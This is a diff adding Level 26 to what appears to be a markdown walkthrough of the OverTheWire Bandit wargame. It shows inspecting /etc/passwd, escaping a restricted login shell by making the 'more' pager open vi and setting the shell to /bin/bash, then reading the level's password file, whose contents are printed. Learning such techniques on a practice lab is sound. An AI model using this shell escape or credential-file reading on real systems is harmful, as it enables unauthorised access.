@@ -603,6 +603,42 @@ ssh bandit.labs.overthewire.org -p 2220 -l bandit25
 ```
 
 
+# Level26
+
+
+```Bash
+bandit25@bandit:~$ more /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ more /usr/bin/showtext 
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+
+// change terminal size to which can see a few line
+
+```Bash
+
+bandit25@bandit:~$ ssh localhost -l bandit26 -i ./bandit26.sshkey
+Could not create directory '/home/bandit25/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes 
+```
+//press v
+
+```bash
+:set shell=/bin/bash
+
+:shell
+[No write since last change]
+bandit26@bandit:~$ more /etc/bandit_pass/bandit26 
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+```
 
 # Levelx
 
